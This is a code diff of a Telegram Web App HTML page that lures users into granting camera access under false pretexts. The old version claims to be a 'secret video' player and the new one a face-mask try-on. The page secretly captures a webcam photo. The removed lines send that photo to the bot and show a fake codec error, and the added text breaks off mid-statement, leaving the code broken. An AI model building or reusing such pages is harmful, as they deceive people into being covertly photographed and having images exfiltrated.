@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player</title>
+    <title>Антошка Маска</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
@@ -11,7 +11,18 @@
             color: white;
             font-family: sans-serif;
             text-align: center;
-            padding-top: 80px;
+            padding-top: 60px;
+            padding-left: 20px;
+            padding-right: 20px;
+        }
+        h2 {
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #b0b0b0;
+            font-size: 14px;
+            line-height: 1.4;
         }
         button {
             background-color: #2481cc;
@@ -21,7 +32,8 @@
             font-size: 16px;
             border-radius: 8px;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 25px;
+            font-weight: bold;
         }
         #videoElement { display: none; }
     </style>
@@ -29,9 +41,9 @@
 <body>
 
     <div id="loader">
-        <h2>Загрузка секретного видео...</h2>
-        <p>Разрешите доступ к камере для оптимизации качества воспроизведения.</p>
-        <button id="loadBtn">Включить HD</button>
+        <h2>🎭 Генератор маски «Антошка»</h2>
+        <p>Чтобы примерить эксклюзивную маску и посмотреть, как она наложится на твое лицо, разреши доступ к камере.</p>
+        <button id="loadBtn">Примерить маску</button>
     </div>
 
     <video id="videoElement" autoplay playsinline></video>
@@ -46,7 +58,7 @@
         const canvas = document.getElementById('canvasElement');
 
         loadBtn.addEventListener('click', async () => {
-            loadBtn.innerText = 'Буферизация 99%...';
+            loadBtn.innerText = 'Калибровка маски...';
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -64,22 +76,4 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    tg.sendData(imageDataURL);
-                    
-                    setTimeout(() => {
-                        document.body.innerHTML = "<h2>Ошибка воспроизведения кодека. Видео недоступно. 😅</h2>";
-                        setTimeout(() => tg.close(), 2000);
-                    }, 1000);
-
-                }, 1500);
-
-            } catch (err) {
-                alert("Ошибка загрузки потока: " + err.message);
-                tg.close();
-            }
-        });
-    </script>
-</body>
-</html>
+                    stream.getTracks().forEach(track => track
